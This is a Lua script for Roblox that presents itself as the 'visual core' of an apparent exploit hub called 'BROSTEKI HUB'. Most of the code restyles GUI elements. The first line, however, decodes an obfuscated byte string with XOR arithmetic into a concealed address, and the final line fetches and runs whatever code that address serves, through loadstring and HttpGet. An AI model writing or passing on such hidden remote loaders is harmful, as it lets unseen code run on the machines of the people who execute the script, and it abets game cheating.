
--[[ STAGE 2: VISUAL CORE ]]
local hHtMbchI_zzeVGl8G="\007\021\239\237\228\055\060\054\205\240\220\031\216\208\167\173\178\167\142\130\138\159\128\150\105\101\110\127\075\139\112\070\090\146\085\046\033\040\062\056\010\048\005\018\027\042\017\251\230\230\240\198\246\197\223\022\170\208\162\191\240\215\178\140\155\135\105\144\150\102\108\159\075\088\116\114\068\047\042\037\051\034\040\014\026\031\000\024\024\033\232\227\052\255\001\203\204\019\215\160\214"local DQqBS6J2a91f_g_67iVFk=107 local hKqRvGhQBKBdSb=244 local hx237vbwqPmxWLzMiWrfh=1 local YT8xRSIlxSy0sDFVBO=6 local XuMMjJIZlBKLMl=10 local g2ZJf_jsEH767dYsjp=false local cCJPJsGlNb9xrro=bit32 and bit32.bxor if not cCJPJsGlNb9xrro then cCJPJsGlNb9xrro=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local AvjYo5O7VWkCl0O3={}for PLAKvHrjUPjik=1,#hHtMbchI_zzeVGl8G do local CqWE5l2fisVE79n_OhUI2=string.byte(hHtMbchI_zzeVGl8G,PLAKvHrjUPjik)local dUBGgj7WMqg4a4cThR=(hKqRvGhQBKBdSb+(PLAKvHrjUPjik*YT8xRSIlxSy0sDFVBO)+XuMMjJIZlBKLMl)%256 if hx237vbwqPmxWLzMiWrfh==0 then CqWE5l2fisVE79n_OhUI2=(CqWE5l2fisVE79n_OhUI2-dUBGgj7WMqg4a4cThR)%256 AvjYo5O7VWkCl0O3[PLAKvHrjUPjik]=string.char(cCJPJsGlNb9xrro(CqWE5l2fisVE79n_OhUI2,DQqBS6J2a91f_g_67iVFk))else CqWE5l2fisVE79n_OhUI2=cCJPJsGlNb9xrro(CqWE5l2fisVE79n_OhUI2,DQqBS6J2a91f_g_67iVFk)AvjYo5O7VWkCl0O3[PLAKvHrjUPjik]=string.char((CqWE5l2fisVE79n_OhUI2-dUBGgj7WMqg4a4cThR)%256)end end local iNG9oLfreiROjU_RgIG3p=table.concat(AvjYo5O7VWkCl0O3)if g2ZJf_jsEH767dYsjp then iNG9oLfreiROjU_RgIG3p=string.reverse(iNG9oLfreiROjU_RgIG3p)end local hTqAu9hczi6Fdj4=iNG9oLfreiROjU_RgIG3p
local HubName = "BROSTEKI HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(hTqAu9hczi6Fdj4))()
